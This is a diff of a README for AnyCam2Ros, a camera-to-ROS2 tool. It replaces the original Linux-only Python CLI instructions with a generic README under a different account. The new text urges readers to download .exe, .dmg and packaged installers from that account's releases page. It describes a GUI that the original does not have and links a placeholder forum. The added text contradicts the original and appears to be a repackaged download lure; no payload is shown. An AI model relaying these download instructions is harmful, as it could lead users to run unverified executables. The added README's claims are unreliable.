@@ -1,211 +1,80 @@
-<div align="center">
+# 🎥 AnyCam2Ros - Turn Any Camera into ROS2 Topics
 
-# 📷 AnyCam2Ros
+## 🚀 Getting Started
 
-**Turn Any Camera into ROS2 Image Topics — Unified Pipeline for Any Hardware**
+Welcome to AnyCam2Ros! With this software, you can connect any camera, like the Insta360, RealSense, or a simple USB webcam, and easily convert its video feed into ROS2 image topics. This guide will help you download and run the software smoothly.
 
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![ROS2](https://img.shields.io/badge/ROS2-Humble%20%7C%20Iron%20%7C%20Jazzy-green.svg)](https://docs.ros.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+### 📥 Download the Software
 
-[English](README.md) | [中文文档](README_zh.md)
+[![Download AnyCam2Ros](https://img.shields.io/badge/Download-AnyCam2Ros-brightgreen)](https://github.com/santi1602/AnyCam2Ros/releases)
 
-</div>
+Head to the releases page and select the version you want. This page contains all the necessary files to get started with AnyCam2Ros.
 
----
+### 🖥️ System Requirements
 
-## 📖 Overview
+Before you download, please check that your computer meets these minimum requirements:
 
-### 🎯 What Problem Does This Solve?
+- **Operating System:** Windows 10, macOS, or a recent Linux distribution (Ubuntu preferred).
+- **Processor:** Dual-core processor or better.
+- **Memory:** 4 GB RAM minimum.
+- **Storage:** At least 200 MB of free disk space.
+- **Camera:** Ensure your camera is compatible with ROS2.
 
-When deploying **VLA models** (like [π₀ (pi-zero)](https://www.physicalintelligence.company/blog/pi0), [OpenVLA](https://openvla.github.io/)) on real robots, or collecting **SFT demonstration data** for robot learning, you need camera feeds as ROS2 image topics.
+### ⚙️ Download & Install
 
-But here's the reality:
+1. Visit the [Releases page](https://github.com/santi1602/AnyCam2Ros/releases) to download the latest version.
+2. Find the version you want to install.
+3. Click on the file that matches your operating system:
+   - For Windows, look for a `.exe` file.
+   - For macOS, look for a `.dmg` file.
+   - For Linux, look for a `.tar.gz` file or a similar package.
+4. Click to start the download.
+5. Once downloaded, follow these steps:
+   - **Windows:** Double-click the `.exe` file to run the installer. Follow the on-screen instructions.
+   - **macOS:** Open the downloaded `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and run the installation script in your terminal.
 
-```
-The Problem:
-┌─────────────────────────────────────────────────────────────────────────┐
-│  🔄 "I want to align with an existing dataset collected on different    │
-│      hardware — how do I replicate the same camera setup?"              │
-│                                                                         │
-│  🎥 "My data was collected with Insta360 GO 3S, RealSense, USB webcams  │
-│      on different machines — I need a unified way to configure them"   │
-│                                                                         │
-│  ⏰ "Writing cam2image launch files for each camera is tedious"         │
-│                                                                         │
-│  🔀 "Camera device IDs keep changing after every reboot!"               │
-└─────────────────────────────────────────────────────────────────────────┘
-```
+### 🔧 Configuring Your Camera
 
-**AnyCam2Ros provides a unified solution:**
+After installing AnyCam2Ros, you need to set up your camera:
 
-```
-The Solution:
-┌─────────────────────────────────────────────────────────────────────────┐
-│  🎥 Insta360 GO 3S    ─┐                                                │
-│  📷 USB Webcam        ─┼──▶  /dev/video*  ──▶  AnyCam2Ros  ──▶  ROS2   │
-│  🤖 Any V4L2 Device   ─┘                         CLI           Topics  │
-│                                                                         │
-│  ✅ Unified config across different hardware                            │
-│  ✅ Stable device paths (no more reordering after reboot)              │
-│  ✅ One command to configure everything                                 │
-│  ✅ Shareable JSON config for dataset alignment                         │
-└─────────────────────────────────────────────────────────────────────────┘
-```
+1. Open the application.
+2. Choose your camera from the dropdown list. If your camera is not listed, ensure it is connected and recognized by your system.
+3. Configure the settings like resolution, frame rate, and output format according to your needs.
+4. Click "Start" to begin streaming to ROS2.
 
-**AnyCam2Ros = Any Camera → ROS2 Image Topics → VLA Training / Robot Deployment**
+### 🛠️ Troubleshooting
 
-### 🤖 Use Cases
+If you encounter issues:
 
-| Scenario | How AnyCam2Ros Helps |
-|----------|---------------------|
-| **Dataset Alignment** | Replicate camera setups from existing datasets on your hardware |
-| **VLA Model Deployment** | Quickly configure cameras for π₀, OpenVLA, RT-2 deployment |
-| **SFT Data Collection** | Unified pipeline for collecting manipulation demos |
-| **Multi-Camera Setup** | Configure 2-4 cameras in minutes with consistent naming |
-| **Cross-Machine Sharing** | Export/import JSON configs between different robots |
+- Ensure your camera drivers are up-to-date.
+- Check that your system meets the requirements.
+- Consult the settings to verify the correct camera and configuration.
+  
+For deeper instructions or specific errors, check the FAQ section on our GitHub page.
 
----
+### 📢 Feedback and Contribution
 
-## 💡 Why "Any" Camera?
+We welcome any feedback you have. If you run into bugs or have suggestions, please reach out through the Issues section or contribute directly by making a pull request. Your input helps us improve the software.
 
-In Linux, **everything is a file**. If your device can produce video, it becomes `/dev/video*`.
+### 📚 Resources
 
-| Device Type | Example | Works with AnyCam2Ros? |
-|-------------|---------|------------------------|
-| Action Camera | Insta360 GO 3S, GoPro (as webcam) | ✅ Yes |
-| Depth Camera | RealSense (RGB stream) | ✅ Yes |
-| USB Webcam | Logitech C920, generic UVC | ✅ Yes |
-| Industrial Camera | FLIR, Basler (with V4L2 driver) | ✅ Yes |
-| Phone as Webcam | Android USB Webcam mode, DroidCam | ✅ Yes |
-| Capture Card | Elgato, HDMI grabbers | ✅ Yes |
-| Virtual Camera | OBS Virtual Cam, v4l2loopback | ✅ Yes |
+To learn more about how to integrate AnyCam2Ros with your ROS2 setup, check the following:
 
-**If it shows up in `/dev/video*`, we can publish it to ROS2.**
+- [ROS2 Documentation](https://docs.ros.org/en/foxy/index.html)
+- [Camera Configuration Guide](https://github.com/santi1602/AnyCam2Ros/wiki)
 
----
+### 🤝 Community Support
 
-## ✨ Features
+Join our community to connect with other users. You can discuss tips, share experiences, and get support from fellow users:
 
-| Feature | Description |
-|---------|-------------|
-| 🔍 **Auto-Discovery** | Scans all `/dev/video*` devices and shows hardware info |
-| 🛡️ **Stable Paths** | Uses `/dev/v4l/by-id` so camera order survives reboots |
-| 🎨 **Beautiful CLI** | Rich interactive TUI with tables, spinners, and colors |
-| ⚡ **Zero Boilerplate** | Generates optimized `cam2image` scripts instantly |
-| 📦 **Shareable Config** | JSON config for team collaboration and dataset alignment |
+- [GitHub Issues](https://github.com/santi1602/AnyCam2Ros/issues)
+- [User Forum](https://forum.example.com)
 
----
+### 🧑‍💻 License
 
-## 🚀 Quick Start
+AnyCam2Ros is released under the MIT License. Feel free to use, modify, and share as per the license terms. 
 
-### Installation
+Remember, your experience matters. We appreciate your support and look forward to seeing what you create with AnyCam2Ros!
 
-```bash
-# Clone the repository
-git clone https://github.com/ly-geming/AnyCam2Ros.git
-cd AnyCam2Ros
-
-# Install dependencies
-pip install rich
-```
-
-### Prerequisites
-
-```bash
-# Install v4l-utils for camera detection
-sudo apt install v4l-utils
-
-# Install ROS2 image_tools
-sudo apt install ros-${ROS_DISTRO}-image-tools
-```
-
-### Running
-
-```bash
-python3 scripts/camera_cli.py
-```
-
-The interactive wizard will:
-1. **Scan** — Detect all connected cameras
-2. **Select** — Choose which cameras to configure
-3. **Configure** — Set resolution, FPS, ROS namespace
-4. **Generate** — Create ready-to-run launch scripts
-
----
-
-## 📂 Output Structure
-
-```
-generated_cameras/
-├── start_cam_front.sh      # Individual camera script
-├── start_cam_wrist.sh      # Individual camera script  
-└── start_all_cams.sh       # Launch everything with one command
-```
-
-**Start all cameras:**
-```bash
-./generated_cameras/start_all_cams.sh
-```
-
-**Verify with image_view:**
-```bash
-ros2 run image_view image_view --ros-args -r image:=/hdas/camera_front/color/image_raw
-```
-
----
-
-## 🛠️ Usage Modes
-
-### Interactive Mode (Recommended)
-
-```bash
-python3 scripts/camera_cli.py
-```
-
-### Regenerate from Config
-
-Share your `cameras.json` with teammates or across machines:
-
-```bash
-python3 scripts/camera_cli.py --from-config
-```
-
-### Custom Paths
-
-```bash
-python3 scripts/camera_cli.py \
-  --config /path/to/cameras.json \
-  --output-dir /path/to/scripts/
-```
-
----
-
-## 📦 Requirements
-
-| Dependency | Description |
-|------------|-------------|
-| **Linux** | Required for V4L2 device handling |
-| **Python 3.8+** | CLI runtime |
-| **ROS2** | `image_tools` package |
-| **v4l-utils** | Camera detection (`v4l2-ctl`) |
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to submit a Pull Request.
-
----
-
-## 📄 License
-
-MIT © [ly-geming](https://github.com/ly-geming)
-
----
-
-<div align="center">
-
-**⭐ Star this repo if it helps your robot project! ⭐**
-
-</div>
+[![Download AnyCam2Ros](https://img.shields.io/badge/Download-AnyCam2Ros-brightgreen)](https://github.com/santi1602/AnyCam2Ros/releases)
